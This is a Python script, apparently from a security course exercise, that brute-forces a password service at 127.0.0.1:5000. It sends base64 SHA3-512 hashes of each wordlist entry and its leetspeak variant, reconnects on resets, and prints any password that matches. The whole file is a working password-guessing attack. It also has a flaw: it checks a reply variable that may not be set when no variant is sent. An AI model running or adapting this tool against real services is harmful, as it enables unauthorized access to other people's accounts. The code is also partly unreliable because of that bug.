import sys
import socket
import base64
import hashlib as hl

chars_in = "oireastbg"
chars_out = "012345789"
replace_lower = str.maketrans(chars_in, chars_out)
replace_upper = str.maketrans(chars_in.upper(), chars_out)

def Main():
    if(len(sys.argv) != 2):
        print("Invalid number of arguments: exiting...")
        exit(0);
    # get every word in wordlist and split by whitespace
    try:
        with open(sys.argv[1]) as list:
            file_content = list.read().split()
    except FileNotFoundError:
        print("File not found: exiting...");
        exit(0);
    addr = ("127.0.0.1", 5000)
    user = "ITS2018:"
    index = 0

    try:
        sock = socket.create_connection(addr)
    except socket.error as err1:
        print("err: %s" % str(err1))
        exit(0)

    try:
        # loop over every word in the list
        while(index < len(file_content)):
            try:
                # get tuple of next word with and without replacements
                pwd = nextPwdTuple(file_content, index)
                sock.sendall(user.encode() +
                    base64.b64encode(hl.sha3_512(pwd[0].encode()).digest()))
                msg = sock.recv(64)
                # check for replacements
                if(pwd[0] != pwd[1]):
                    sock.sendall(user.encode() +
                        base64.b64encode(hl.sha3_512(pwd[1].encode()).digest()))
                    msg_replace = sock.recv(64)
                    if(msg_replace == b'' or int(msg_replace[1]) == 50):
                        raise ConnectionResetError
                elif(int(msg[1]) == 50):
                    raise ConnectionResetError
            # reset => create new connection and don't increase index
            except ConnectionResetError:
                print("Connection reset: restarting...")
                sock.close()
                try:
                    sock = socket.create_connection(addr)
                except socket.error as err2:
                    print("err: %s" % str(err2))
                    exit(0)
                continue
            # check if successful
            if(int(msg[1]) == 49 or int(msg_replace[1]) == 49):
                if(int(msg[1]) == 49):
                    print("%s: %s:SHA%s" % (pwd[0], user[:-1], base64.b64encode(
                        hl.sha3_512(pwd[0].encode()).digest()).decode()))
                else:
                    print("%s: %s:SHA%s" % (pwd[1], user[:-1], base64.b64encode(
                        hl.sha3_512(pwd[1].encode()).digest()).decode()))
                break
            index += 1
    except KeyboardInterrupt:
        print("Interrupt received: exiting...")
        sock.close()
        exit(0)

    sock.close()

def nextPwdTuple(file_content, index):
    return (file_content[index], replaceChars(file_content[index]))

def replaceChars(word):
    return word.translate(replace_lower).translate(replace_upper)
        
if __name__ == '__main__':
    Main()
